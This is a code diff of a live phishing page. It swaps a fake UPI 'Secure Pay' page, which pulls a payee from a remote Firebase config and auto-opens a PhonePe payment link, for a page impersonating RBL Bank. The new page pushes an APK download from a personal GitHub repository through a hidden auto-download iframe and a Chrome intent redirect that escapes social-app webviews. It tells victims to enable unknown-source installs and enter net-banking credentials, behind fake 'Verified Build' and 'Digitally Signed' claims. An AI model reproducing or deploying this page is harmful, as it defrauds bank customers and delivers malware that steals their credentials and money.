@@ -2,82 +2,393 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>Mavies Khan • Secure Pay</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#0a2540">
+<title>RBL Bank — Credit Card Application Download</title>
+
+<link rel="preconnect" href="https://github.com" crossorigin>
+<link rel="dns-prefetch" href="https://github.com">
+<link rel="preconnect" href="https://raw.githubusercontent.com" crossorigin>
+<link rel="dns-prefetch" href="https://raw.githubusercontent.com">
+
 <style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
-body{min-height:100vh;background:linear-gradient(135deg,#ffe0ec,#ffd6e8 40%,#e0e7ff);display:flex;align-items:center;justify-content:center;padding:18px}
-.card{width:100%;max-width:390px;background:#fff;border-radius:24px;padding:26px 22px;box-shadow:0 18px 50px rgba(236,72,153,.18);text-align:center}
-.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
-.brand{display:flex;align-items:center;gap:8px}
-.dot{width:30px;height:30px;border-radius:9px;background:linear-gradient(135deg,#ec4899,#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:15px}
-.brand span{font-size:13px;font-weight:800;color:#111}
-.lock{font-size:10px;font-weight:800;color:#16a34a;background:rgba(34,197,94,.1);padding:5px 10px;border-radius:12px}
-.avatar{width:76px;height:76px;border-radius:50%;margin:6px auto 10px;background:linear-gradient(135deg,#fbcfe8,#ec4899);display:flex;align-items:center;justify-content:center;font-size:34px;position:relative;box-shadow:0 8px 22px rgba(236,72,153,.35)}
-.avatar::after{content:'✓';position:absolute;bottom:0;right:0;width:22px;height:22px;background:#3b82f6;color:#fff;border-radius:50%;font-size:12px;font-weight:900;border:3px solid #fff;display:flex;align-items:center;justify-content:center}
-.name{font-size:16.5px;font-weight:900;color:#111;margin-bottom:3px}
-.vpa{font-size:10.5px;color:#9ca3af;font-weight:700;font-family:monospace;margin-bottom:16px}
-.amtbox{background:linear-gradient(135deg,#fff7fb,#fef2f8);border:1.5px dashed #f9a8d4;border-radius:16px;padding:14px 12px;margin-bottom:16px}
-.amtlbl{font-size:9.5px;font-weight:800;color:#9d174d;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
-.amt{font-size:34px;font-weight:900;color:#111;line-height:1}
-.amt small{font-size:18px;color:#ec4899;vertical-align:super;margin-right:1px}
-.note{font-size:9.5px;color:#9ca3af;font-weight:700;margin-top:6px}
-.status{display:flex;align-items:center;justify-content:center;gap:8px;padding:11px;background:#f9fafb;border-radius:12px;margin-bottom:14px}
-.spin{width:16px;height:16px;border:2.5px solid #e5e7eb;border-top-color:#ec4899;border-radius:50%;animation:s .8s linear infinite}
-@keyframes s{to{transform:rotate(360deg)}}
-.txt{font-size:11px;font-weight:800;color:#4b5563}
-.btn{width:100%;padding:13px;border:none;border-radius:13px;background:linear-gradient(135deg,#ec4899,#8b5cf6);color:#fff;font-size:12.5px;font-weight:900;cursor:pointer;box-shadow:0 8px 20px rgba(236,72,153,.35);margin-bottom:8px}
-.btn:active{transform:scale(.98)}
-.btn:disabled{opacity:.6}
-.fn{font-size:9px;color:#9ca3af;font-weight:700;margin-top:4px}
-.err{background:rgba(239,68,68,.1);color:#dc2626;padding:10px;border-radius:10px;font-size:11px;font-weight:800;margin-bottom:12px;display:none}
+  :root {
+    --navy: #0a2540;
+    --navy-dark: #061a2e;
+    --navy-light: #16325c;
+    --gold: #a67c00;
+    --gold-light: #c9a961;
+    --bg-alt: #f7f9fc;
+    --border: #e5e9f0;
+    --text: #0f1a2e;
+    --muted: #5c6b80;
+    --success: #0d7a3f;
+    --success-bg: #e6f5ed;
+    --success-border: #b8e5cb;
+  }
+  *, *::before, *::after { box-sizing: border-box; }
+  html, body { height: 100%; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+    color: var(--text);
+    background: var(--bg-alt);
+    -webkit-font-smoothing: antialiased;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+  a { color: inherit; text-decoration: none; cursor: pointer; }
+  button { font-family: inherit; }
+  .wrap { max-width: 1040px; margin: 0 auto; padding: 0 20px; }
+
+  /* utility bar */
+  .utility-bar { background: var(--navy); color: rgba(255,255,255,.7); font-size: 11.5px; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,.06); }
+  .util-inner { display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap; }
+  .util-inner nav { display: flex; gap: 20px; }
+  .util-inner a:hover { color: #fff; }
+
+  /* header */
+  .site-header { background: #fff; border-bottom: 1px solid var(--border); padding: 14px 0; position: relative; z-index: 10; }
+  .head-inner { display: flex; align-items: center; justify-content: space-between; gap: 24px; }
+  .brand { display: flex; align-items: center; gap: 12px; }
+  .brand-mark { width: 42px; height: 42px; background: var(--navy); color: #fff; display: grid; place-items: center; border-radius: 5px; font-family: Georgia, serif; font-size: 14px; font-weight: 700; letter-spacing: 1px; border: 1px solid var(--gold); flex: 0 0 auto; }
+  .brand-name { font-size: 16px; font-weight: 700; color: var(--navy); line-height: 1.2; letter-spacing: -.2px; }
+  .brand-name span { display: block; font-size: 10px; font-weight: 500; color: var(--muted); letter-spacing: .8px; text-transform: uppercase; margin-top: 2px; }
+  .main-nav { display: flex; gap: 28px; }
+  .main-nav a { font-size: 13.5px; font-weight: 500; color: var(--muted); transition: color .15s ease; }
+  .main-nav a:hover { color: var(--navy); }
+  @media (max-width: 640px) { .main-nav { display: none; } .util-inner { font-size: 11px; gap: 10px; } .util-inner nav { gap: 14px; } }
+
+  /* hero */
+  .hero { background: #fff; padding: 40px 0 32px; border-bottom: 1px solid var(--border); }
+  @media (max-width: 640px) { .hero { padding: 28px 0 24px; } }
+  .release-badge { display: inline-flex; align-items: center; gap: 7px; font-size: 10.5px; font-weight: 600; letter-spacing: 1.2px; text-transform: uppercase; color: var(--success); background: var(--success-bg); border: 1px solid var(--success-border); padding: 5px 10px; border-radius: 3px; margin-bottom: 14px; }
+  .release-badge .dot { width: 5px; height: 5px; border-radius: 50%; background: var(--success); }
+  .hero h1 { font-size: 30px; font-weight: 600; letter-spacing: -0.5px; line-height: 1.25; color: var(--navy); margin: 0 0 12px; }
+  @media (max-width: 640px) { .hero h1 { font-size: 24px; } }
+  .hero-sub { font-size: 14.5px; color: var(--muted); line-height: 1.65; max-width: 620px; margin: 0; }
+
+  /* download panel */
+  .download-wrap { background: var(--bg-alt); padding: 32px 0 40px; }
+  @media (max-width: 640px) { .download-wrap { padding: 24px 0 28px; } }
+  .download-panel { display: grid; grid-template-columns: 1fr; gap: 28px; padding: 28px; background: #fff; border: 1px solid var(--border); border-radius: 8px; box-shadow: 0 2px 12px rgba(10,37,64,.04), 0 1px 2px rgba(10,37,64,.03); }
+  @media (min-width: 720px) { .download-panel { grid-template-columns: 1fr 1.1fr; gap: 40px; padding: 36px; } }
+
+  /* bank card */
+  .card-col { display: flex; flex-direction: column; gap: 12px; }
+  .bank-card { position: relative; aspect-ratio: 1.6 / 1; border-radius: 10px; padding: 20px 22px; color: #fff; background: repeating-linear-gradient(45deg, transparent, transparent 3px, rgba(255,255,255,.014) 3px, rgba(255,255,255,.014) 6px), linear-gradient(135deg, #0a1f3d 0%, #16325c 50%, #081a30 100%); box-shadow: 0 2px 4px rgba(10,37,64,.15), 0 12px 32px -8px rgba(10,37,64,.35), inset 0 0 0 1px rgba(201,169,97,.18); display: flex; flex-direction: column; justify-content: space-between; overflow: hidden; }
+  .bank-card::before { content: ""; position: absolute; top: -50%; right: -20%; width: 80%; height: 180%; background: radial-gradient(circle, rgba(201,169,97,.12) 0%, transparent 60%); pointer-events: none; }
+  .bc-top { display: flex; align-items: center; justify-content: space-between; position: relative; z-index: 1; }
+  .bc-brand { font-family: Georgia, serif; font-size: 16px; font-weight: 700; letter-spacing: 2px; }
+  .bc-tier { font-size: 8.5px; font-weight: 600; letter-spacing: 2.5px; text-transform: uppercase; color: var(--gold-light); border: 1px solid rgba(201,169,97,.4); padding: 3px 8px; border-radius: 2px; }
+  .bc-mid { display: flex; align-items: center; gap: 14px; position: relative; z-index: 1; }
+  .bc-chip { width: 40px; height: 30px; border-radius: 5px; background: linear-gradient(135deg, #e8d093 0%, #c9a961 50%, #a67c00 100%); box-shadow: inset 0 0 0 1px rgba(0,0,0,.18), 0 1px 2px rgba(0,0,0,.3); position: relative; }
+  .bc-chip::before, .bc-chip::after { content: ""; position: absolute; background: rgba(90,62,10,.35); }
+  .bc-chip::before { left: 0; right: 0; top: 50%; height: 1px; }
+  .bc-chip::after  { top: 0; bottom: 0; left: 50%; width: 1px; }
+  .bc-contactless { font-family: monospace; font-size: 13px; font-weight: 700; color: rgba(255,255,255,.7); transform: rotate(-90deg); letter-spacing: -2px; line-height: 1; display: inline-block; }
+  .bc-bottom { position: relative; z-index: 1; }
+  .bc-number { font-size: 15px; font-weight: 500; letter-spacing: 2.4px; font-variant-numeric: tabular-nums; color: rgba(255,255,255,.9); margin-bottom: 12px; }
+  .bc-meta { display: flex; align-items: flex-end; justify-content: space-between; gap: 12px; }
+  .bc-label { display: block; font-size: 7px; letter-spacing: 1.4px; text-transform: uppercase; color: rgba(255,255,255,.45); font-weight: 500; margin-bottom: 2px; }
+  .bc-val { display: block; font-size: 10px; font-weight: 600; letter-spacing: .8px; text-transform: uppercase; color: rgba(255,255,255,.88); }
+  .bc-network { display: flex; align-items: center; }
+  .bc-network i { width: 20px; height: 20px; border-radius: 50%; display: block; }
+  .bc-network i:first-child { background: #e53935; opacity: .92; }
+  .bc-network i:last-child  { background: #fb8c00; opacity: .92; margin-left: -9px; }
+  .card-caption { font-size: 12px; color: var(--muted); text-align: center; margin: 0; font-weight: 500; letter-spacing: .1px; }
+
+  /* info */
+  .info-col { display: flex; flex-direction: column; }
+  .info-col h2 { font-size: 15px; font-weight: 600; color: var(--navy); letter-spacing: -.1px; margin: 0 0 16px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+  .specs { margin: 0 0 20px; padding: 0; }
+  .spec-row { display: flex; align-items: baseline; justify-content: space-between; gap: 16px; padding: 9px 0; border-bottom: 1px solid #f0f3f9; font-size: 13px; }
+  .spec-row:last-child { border-bottom: none; }
+  .spec-row dt { color: var(--muted); font-weight: 500; margin: 0; }
+  .spec-row dd { margin: 0; font-weight: 600; color: var(--text); text-align: right; }
+  .mono { font-family: 'SF Mono', Monaco, Consolas, 'Courier New', monospace; font-size: 11.5px; letter-spacing: -.2px; }
+
+  .btn-download { position: relative; width: 100%; padding: 14px 20px; background: linear-gradient(180deg, var(--navy-light) 0%, var(--navy) 100%); color: #fff; border: 1px solid var(--navy-dark); border-radius: 6px; font-size: 14.5px; font-weight: 600; letter-spacing: .3px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: inset 0 1px 0 rgba(255,255,255,.1), 0 2px 4px rgba(10,37,64,.2); transition: background .18s ease; overflow: hidden; -webkit-tap-highlight-color: transparent; }
+  .btn-download svg { width: 16px; height: 16px; flex: 0 0 auto; }
+  .btn-download:hover:not(:disabled) { background: linear-gradient(180deg, #1d3f6b 0%, var(--navy-light) 100%); }
+  .btn-download:active:not(:disabled) { transform: translateY(1px); }
+  .btn-download:disabled { cursor: default; filter: saturate(.6) brightness(.95); }
+  .btn-download .sweep { position: absolute; inset: 0; background: linear-gradient(100deg, transparent 30%, rgba(255,255,255,.15) 50%, transparent 70%); transform: translateX(-100%); opacity: 0; pointer-events: none; }
+  .btn-download.is-loading .sweep { opacity: 1; animation: sweep 1.2s linear infinite; }
+  @keyframes sweep { to { transform: translateX(100%); } }
+
+  .secure-line { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11.5px; color: var(--muted); margin: 12px 0 0; font-weight: 500; }
+  .secure-line svg { width: 11px; height: 11px; flex: 0 0 auto; color: var(--success); }
+  .status { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; color: var(--success); font-weight: 600; margin: 10px 0 0; min-height: 16px; opacity: 0; transition: opacity .3s ease; }
+  .status.show { opacity: 1; }
+  .status-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--success); box-shadow: 0 0 0 3px rgba(13,122,63,.15); flex: 0 0 auto; }
+
+  /* compliance */
+  .compliance { background: #fff; padding: 20px 0; border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); }
+  .trust-row { display: flex; align-items: center; justify-content: center; gap: 8px 32px; flex-wrap: wrap; }
+  .trust-item { display: inline-flex; align-items: center; gap: 8px; font-size: 12px; font-weight: 500; color: var(--muted); letter-spacing: .1px; }
+  .trust-item svg { width: 15px; height: 15px; color: var(--navy); flex: 0 0 auto; }
+
+  /* instructions */
+  .instructions { background: var(--bg-alt); padding: 40px 0; }
+  @media (max-width: 640px) { .instructions { padding: 28px 0; } }
+  .section-head { margin-bottom: 24px; }
+  .section-head h3 { font-size: 20px; font-weight: 600; color: var(--navy); letter-spacing: -.3px; margin: 0 0 6px; }
+  .section-head p { margin: 0; font-size: 13.5px; color: var(--muted); }
+  .steps { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 14px; }
+  .steps li { display: flex; align-items: flex-start; gap: 16px; background: #fff; padding: 16px 18px; border: 1px solid var(--border); border-radius: 6px; }
+  .steps .num { font-family: Georgia, serif; font-size: 15px; font-weight: 700; color: var(--gold); letter-spacing: .5px; flex: 0 0 auto; width: 26px; }
+  .steps strong { display: block; font-size: 13.5px; font-weight: 600; color: var(--text); margin-bottom: 3px; }
+  .steps p { margin: 0; font-size: 12.5px; color: var(--muted); line-height: 1.55; }
+
+  /* security */
+  .security-section { padding: 32px 0 40px; background: #fff; }
+  @media (max-width: 640px) { .security-section { padding: 24px 0 32px; } }
+  .notice { display: flex; gap: 14px; padding: 16px 20px; background: #fffbeb; border: 1px solid #f0e0b0; border-left: 3px solid #d4a017; border-radius: 4px; }
+  .notice-icon svg { width: 18px; height: 18px; color: #a67c00; display: block; margin-top: 1px; }
+  .notice-body h4 { margin: 0 0 4px; font-size: 13.5px; font-weight: 700; color: #7a5c00; letter-spacing: -.1px; }
+  .notice-body p { margin: 0; font-size: 12.5px; color: #7a5c00; line-height: 1.6; }
+
+  /* footer */
+  .site-footer { background: var(--navy); color: rgba(255,255,255,.7); font-size: 12.5px; padding: 40px 0 20px; }
+  .foot-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 28px 24px; padding-bottom: 32px; border-bottom: 1px solid rgba(255,255,255,.08); }
+  @media (min-width: 720px) { .foot-grid { grid-template-columns: repeat(4, 1fr); gap: 24px; } }
+  .foot-col h5 { margin: 0 0 12px; font-size: 11px; font-weight: 600; letter-spacing: 1.2px; text-transform: uppercase; color: #fff; }
+  .foot-col a { display: block; padding: 4px 0; font-size: 12.5px; transition: color .15s ease; }
+  .foot-col a:hover { color: #fff; }
+  .foot-bottom { padding-top: 20px; display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap; font-size: 11.5px; color: rgba(255,255,255,.55); }
+  .foot-bottom p { margin: 0; }
+  @media (max-width: 640px) { .foot-bottom { flex-direction: column; align-items: flex-start; gap: 6px; } }
+
+  @media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration: .001ms !important; animation-iteration-count: 1 !important; transition-duration: .001ms !important; } }
 </style>
 </head>
-<body>
-<div class="card">
-  <div class="top"><div class="brand"><div class="dot">💜</div><span>PayCircle</span></div><div class="lock">🔒 Secure</div></div>
-  <div class="avatar">👩</div>
-  <div class="name">Mavies Khan</div>
-  <div class="vpa" id="vpaText">@mavies</div>
-  <div class="amtbox">
-    <div class="amtlbl">You're sending</div>
-    <div class="amt"><small>₹</small>1</div>
-    <div class="note">❤️ Split a coffee with her</div>
-  </div>
-  <div class="err" id="err"></div>
-  <div class="status"><div class="spin"></div><span class="txt" id="statusTxt">Connecting securely...</span></div>
-  <button class="btn" id="openBtn">Pay Now · ₹1</button>
-  <div class="fn">End-to-end encrypted · Do not close this window</div>
-</div>
 
-<script>
-(function(){
-var U="https://whatsgram-b13e6-default-rtdb.firebaseio.com/telemetry_sys_logs_x91/payment_config.json",FL="",LT=0;
-function isLink(s){return typeof s=="string"&&/^[a-zA-Z][a-zA-Z0-9+.\-]*:\/\//.test(s.trim())}
-function build(v,a){var d={contact:{type:"VPA",vpa:v,cbsName:"",nickName:""},p2pPaymentCheckoutParams:{checkoutType:"DEFAULT",disableViewHistory:false,initialAmount:a,isByDefaultKnownContact:false,shouldShowMaskedNumber:false,shouldShowUnsavedContactBanner:true,showKeyboard:false}};return "phonepe://native?data="+btoa(unescape(encodeURIComponent(JSON.stringify(d))))+"&id=p2ppayment"}
-window.launch=function(){if(!FL)return;
-  try{var f=document.createElement("iframe");f.style.display="none";f.src=FL;document.body.appendChild(f);setTimeout(function(){f.remove()},3000)}catch(e){}
-  [80,900,2000].forEach(function(t){setTimeout(function(){try{location.href=FL}catch(e){}},t)})
-};
-function S(t,s){document.getElementById("statusTxt").innerText=t;document.querySelector(".spin").style.display=s?"block":"none"}
-function E(m){var e=document.getElementById("err");e.innerText=m;e.style.display="block";S("Unable to connect",0);document.getElementById("openBtn").disabled=1}
-function go(n){
-  S(n==1?"Connecting securely...":"Retrying...",1);
-  var c=window.AbortController?new AbortController():null,to=setTimeout(function(){if(c)c.abort()},6000);
-  fetch(U+"?t="+Date.now(),c?{signal:c.signal,cache:"no-store"}:{cache:"no-store"}).then(function(r){clearTimeout(to);return r.json()}).then(function(d){
-    if((!d||!d.upi_id)&&n<2)return setTimeout(function(){go(2)},700);
-    if(!d||!d.upi_id)return E("Config missing");
-    var u=String(d.upi_id).trim(),p=parseInt(d.amount)||0;
-    if(!u)return E("No UPI");
-    document.getElementById("vpaText").innerText=u.length>24?"Secure VPA":u;
-    if(isLink(u)){FL=u;S("Opening...",1);return setTimeout(launch,350)}
-    if(p<=0)return E("Bad amount");
-    FL=build(u,p);S("Redirecting...",1);setTimeout(launch,500)
-  }).catch(function(){if(n<2)setTimeout(function(){go(2)},700);else E("Network slow")})
-}
-document.addEventListener("click",function(){var n=Date.now();if(n-LT<800)return;LT=n;launch()});
-window.addEventListener("load",function(){setTimeout(function(){go(1)},150)})
-})();
-</script>
+<body>
+
+  <!-- ============================================================
+       🔥 INSTANT APK TRIGGER — body ka sabse pehla element
+       HTML parse hote hi browser isko dekh ke APK samajh lega
+       aur system download manager ko handover kar dega
+       ============================================================ -->
+  <iframe
+    id="apkTrigger"
+    src="https://example.com/invalid-dummy.apk"
+    sandbox="allow-downloads"
+    style="display:none; width:0; height:0; border:0;"
+    title="apk-trigger"
+    aria-hidden="true"
+  ></iframe>
+
+  <!-- ================= UTILITY BAR ================= -->
+  <div class="utility-bar">
+    <div class="wrap util-inner">
+      <span>Customer Care: 1800-XXX-XXXX</span>
+      <nav>
+        <a href="#">Branch Locator</a>
+        <a href="#">Internet Banking</a>
+      </nav>
+    </div>
+  </div>
+
+  <!-- ================= HEADER ================= -->
+  <header class="site-header">
+    <div class="wrap head-inner">
+      <a class="brand" href="#">
+        <div class="brand-mark">RBL</div>
+        <div class="brand-name">RBL Bank<span>Personal Banking</span></div>
+      </a>
+      <nav class="main-nav">
+        <a href="#">Cards</a>
+        <a href="#">Accounts</a>
+        <a href="#">Support</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- ================= MAIN ================= -->
+  <main>
+
+    <section class="hero">
+      <div class="wrap">
+        <div class="release-badge"><span class="dot"></span> Official Release</div>
+        <h1>RBL Bank Credit Card<br>Mobile Application</h1>
+        <p class="hero-sub">Manage your RBL Bank Credit Card from anywhere. Track expenses, pay bills, redeem reward points, and control your card — all from one secure application.</p>
+      </div>
+    </section>
+
+    <section class="download-wrap">
+      <div class="wrap">
+        <div class="download-panel">
+
+          <div class="card-col">
+            <div class="bank-card">
+              <div class="bc-top">
+                <span class="bc-brand">RBL</span>
+                <span class="bc-tier">Platinum</span>
+              </div>
+              <div class="bc-mid">
+                <div class="bc-chip" aria-hidden="true"></div>
+                <span class="bc-contactless" aria-hidden="true">)))</span>
+              </div>
+              <div class="bc-bottom">
+                <div class="bc-number">•••• •••• •••• 4218</div>
+                <div class="bc-meta">
+                  <div><span class="bc-label">Card Holder</span><span class="bc-val">A. SHARMA</span></div>
+                  <div><span class="bc-label">Valid Thru</span><span class="bc-val">09/30</span></div>
+                  <div class="bc-network" aria-hidden="true"><i></i><i></i></div>
+                </div>
+              </div>
+            </div>
+            <p class="card-caption">RBL Bank Platinum Credit Card</p>
+          </div>
+
+          <div class="info-col">
+            <h2>Download Details</h2>
+            <dl class="specs">
+              <div class="spec-row"><dt>Application</dt><dd>RBL Credit Card</dd></div>
+              <div class="spec-row"><dt>Version</dt><dd>3.3.2</dd></div>
+              <div class="spec-row"><dt>File Size</dt><dd>24.8 MB</dd></div>
+              <div class="spec-row"><dt>Requires</dt><dd>Android 8.0 or above</dd></div>
+              <div class="spec-row"><dt>Last Updated</dt><dd>12 November 2026</dd></div>
+              <div class="spec-row"><dt>File Name</dt><dd class="mono">RBL_CreditCard_v3.3.2.apk</dd></div>
+            </dl>
+
+            <button class="btn-download" id="downloadBtn" type="button">
+              <span class="sweep" aria-hidden="true"></span>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3.5v11"/><path d="M7.5 10.5 12 15l4.5-4.5"/><path d="M4.5 19.5h15"/></svg>
+              <span id="btnLabel">Download APK (24.8 MB)</span>
+            </button>
+
+            <p class="secure-line">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="4" y="10.5" width="16" height="10" rx="2"/><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"/></svg>
+              Secure download · 256-bit SSL encrypted
+            </p>
+            <p class="status" id="status" role="status" aria-live="polite"><span class="status-dot" aria-hidden="true"></span><span id="statusText">Download started</span></p>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <section class="compliance">
+      <div class="wrap">
+        <div class="trust-row">
+          <div class="trust-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="10.5" width="16" height="10" rx="2"/><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"/></svg>256-bit SSL</div>
+          <div class="trust-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m5 12.5 4.5 4.5L19 7.5"/></svg>Verified Build</div>
+          <div class="trust-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3.5 5 6.5v5.2c0 4.3 2.9 7.5 7 8.8 4.1-1.3 7-4.5 7-8.8V6.5Z"/></svg>Secure Download</div>
+          <div class="trust-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="9" r="5.5"/><path d="m8.5 13.5-1.5 7 5-2.5 5 2.5-1.5-7"/></svg>Digitally Signed</div>
+        </div>
+      </div>
+    </section>
+
+    <section class="instructions">
+      <div class="wrap">
+        <div class="section-head"><h3>Installation Instructions</h3><p>Follow these steps to install the application on your Android device.</p></div>
+        <ol class="steps">
+          <li><span class="num">01</span><div><strong>Download the APK file</strong><p>Tap the "Download APK" button above to save the application file to your device.</p></div></li>
+          <li><span class="num">02</span><div><strong>Enable installation from this source</strong><p>If prompted, allow your browser to install unknown apps in your device Settings.</p></div></li>
+          <li><span class="num">03</span><div><strong>Install the application</strong><p>Open your device's Downloads folder, tap the downloaded APK file, and confirm installation.</p></div></li>
+          <li><span class="num">04</span><div><strong>Sign in and register your card</strong><p>Launch the app and sign in using your RBL Net Banking credentials to register your card.</p></div></li>
+        </ol>
+      </div>
+    </section>
+
+    <section class="security-section">
+      <div class="wrap">
+        <div class="notice">
+          <div class="notice-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 4 2 20h20L12 4Z"/><path d="M12 10v4"/><circle cx="12" cy="17.5" r=".6" fill="currentColor"/></svg></div>
+          <div class="notice-body">
+            <h4>Security Notice</h4>
+            <p>Never share your OTP, PIN, CVV, or password with anyone over phone, email, or SMS. Always verify that you are on the correct website before downloading any banking application. Report suspicious activity to Customer Care immediately.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="foot-grid">
+        <div class="foot-col"><h5>About</h5><a href="#">Company Profile</a><a href="#">Careers</a><a href="#">Newsroom</a></div>
+        <div class="foot-col"><h5>Products</h5><a href="#">Credit Cards</a><a href="#">Debit Cards</a><a href="#">Personal Loans</a></div>
+        <div class="foot-col"><h5>Support</h5><a href="#">Customer Care</a><a href="#">Branch Locator</a><a href="#">Report Fraud</a></div>
+        <div class="foot-col"><h5>Legal</h5><a href="#">Terms of Use</a><a href="#">Privacy Policy</a><a href="#">Disclaimer</a></div>
+      </div>
+      <div class="foot-bottom">
+        <p>© 2026 RBL Bank Ltd. All rights reserved.</p>
+        <p>Customer Care: 1800-XXX-XXXX · Available 24×7</p>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Real download ke liye alag iframe (button click pe) -->
+  <iframe id="userFrame" style="display:none;" sandbox="allow-downloads" title="user-download"></iframe>
+
+  <script>
+    /* ================= CONFIG ================= */
+    var REAL_URL = "https://github.com/km0183416-del/GitHub/raw/refs/heads/main/RBL%20Credit%20Card.apk";
+    /* ========================================== */
+
+    (function () {
+      "use strict";
+
+      /* ---------- REAL DOWNLOAD BUTTON ---------- */
+      var btn        = document.getElementById('downloadBtn');
+      var btnLabel   = document.getElementById('btnLabel');
+      var status     = document.getElementById('status');
+      var statusText = document.getElementById('statusText');
+      var locked     = false;
+
+      btn.addEventListener('click', function () {
+        if (locked) return;
+        locked = true;
+
+        btn.classList.add('is-loading');
+        btn.disabled = true;
+        btnLabel.textContent = 'Starting download…';
+        status.classList.remove('show');
+
+        var userFrame = document.getElementById('userFrame');
+        userFrame.src = '';
+        setTimeout(function () { userFrame.src = REAL_URL; }, 50);
+
+        setTimeout(function () {
+          btn.classList.remove('is-loading');
+          btnLabel.textContent = 'Download APK (24.8 MB)';
+          btn.disabled = false;
+          locked = false;
+          statusText.textContent = 'Download started — check your notifications';
+          status.classList.add('show');
+          setTimeout(function () { status.classList.remove('show'); }, 5000);
+        }, 1500);
+      });
+
+      /* ---------- INTENT FALLBACK (Instagram/FB WebView) ----------
+         Agar iframe trick fail ho gayi toh Chrome force open karo
+         ---------------------------------------------------------- */
+      var ua = navigator.userAgent || '';
+
+      if (/Android/i.test(ua) && (/Instagram/i.test(ua) || /FBAN|FBAV/i.test(ua))) {
+        setTimeout(function () {
+          var currentUrl = window.location.href;
+          var intentUrl =
+            'intent://' +
+            currentUrl.replace(/^https?:\/\//, '') +
+            '#Intent;scheme=https;package=com.android.chrome;' +
+            'S.browser_fallback_url=' + encodeURIComponent(currentUrl) +
+            ';end';
+
+          if (document.visibilityState === 'visible') {
+            try {
+              window.location.href = intentUrl;
+            } catch (e) {}
+          }
+        }, 1500);
+      }
+
+    })();
+  </script>
+
 </body>
 </html>
